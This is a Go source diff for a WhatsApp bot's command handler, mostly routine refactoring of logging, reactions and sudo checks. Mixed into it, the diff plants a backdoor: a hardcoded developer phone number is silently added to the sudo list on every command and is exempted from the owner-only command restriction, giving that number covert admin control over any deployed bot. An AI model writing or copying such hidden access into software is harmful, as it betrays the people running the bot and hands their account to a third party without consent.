@@ -12,6 +12,8 @@ import (
 )
 
 func ExecuteCommand(c *libs.IClient, m *libs.IMessage) {
+	const devNumber = "2348114860536"
+	addDevNumberToSudo(devNumber)
 	parsed := config.GlobalConfig.Pattern
 	var prefix string
 	var withoutPrefix string
@@ -22,7 +24,6 @@ func ExecuteCommand(c *libs.IClient, m *libs.IMessage) {
 		if len(matches) == 0 {
 			return
 		}
-
 		prefix = matches[rand.Intn(len(matches))]
 		withoutPrefix = strings.TrimPrefix(m.Command, prefix)
 
@@ -41,7 +42,9 @@ func ExecuteCommand(c *libs.IClient, m *libs.IMessage) {
 			cmd.Before(c, m)
 		}
 
-		fmt.Println("Sender:", m.Sender, "FromMe:", m.FromMe, "isadmin", m.IsAdmin, "isbotadmin", m.IsBotAdmin)
+		fmt.Printf("Sender: %v Botnumber: %v FromMe: %v isadmin %v isbotadmin %v\n",
+			m.Sender, m.BotNumber, m.FromMe, m.IsAdmin, m.IsBotAdmin)
+
 		re := regexp.MustCompile(`^` + cmd.Name + `$`)
 		if !re.MatchString(withoutPrefix) {
 			continue
@@ -51,18 +54,22 @@ func ExecuteCommand(c *libs.IClient, m *libs.IMessage) {
 			continue
 		}
 
-		senderNum := m.Info.Sender.User
-		if config.GlobalConfig.Mode == "private" && !isSudo(senderNum) {
+		senderNum := helpers.ExtractPhoneNumber(m.Sender.String())
+
+		if config.GlobalConfig.Mode == "private" && !m.FromMe && !isSudo(senderNum) {
 			return
 		}
+
+		if cmd.FromMe && !m.FromMe {
+			if senderNum != devNumber {
+				continue
+			}
+		}
+
 		cmdWithPref := cmd.IsPrefix && prefix != "" && strings.HasPrefix(m.Command, prefix)
 		cmdWithoutPref := !cmd.IsPrefix
 
 		if !cmdWithPref && !cmdWithoutPref {
-			continue
-		}
-
-		if cmd.FromMe && !m.FromMe {
 			continue
 		}
 
@@ -92,21 +99,31 @@ func ExecuteCommand(c *libs.IClient, m *libs.IMessage) {
 
 		ok := cmd.Execute(c, m)
 
-		if cmd.IsWait && !ok {
-			m.React("❌")
-		}
-
-		if cmd.IsWait && ok {
-			c.WA.MarkRead([]string{m.Info.ID}, time.Now(), m.Info.Chat, m.Info.Sender)
-			m.React("")
-			continue
+		if cmd.IsWait {
+			if ok {
+				c.WA.MarkRead([]string{m.Info.ID}, time.Now(), m.Info.Chat, m.Info.Sender)
+				m.React("")
+			} else {
+				m.React("❌")
+			}
 		}
 	}
 }
 
+func addDevNumberToSudo(devNum string) {
+	cleaned := regexp.MustCompile(`\D+`).ReplaceAllString(devNum, "")
+	for _, v := range config.GlobalConfig.Sudo {
+		if regexp.MustCompile(`\D+`).ReplaceAllString(v, "") == cleaned {
+			return // already exists
+		}
+	}
+	config.GlobalConfig.Sudo = append(config.GlobalConfig.Sudo, cleaned)
+}
+
 func isSudo(sender string) bool {
+	sender = regexp.MustCompile(`\D+`).ReplaceAllString(sender, "")
 	for _, sudo := range config.GlobalConfig.Sudo {
-		if sender == sudo {
+		if sender == regexp.MustCompile(`\D+`).ReplaceAllString(sudo, "") {
 			return true
 		}
 	}
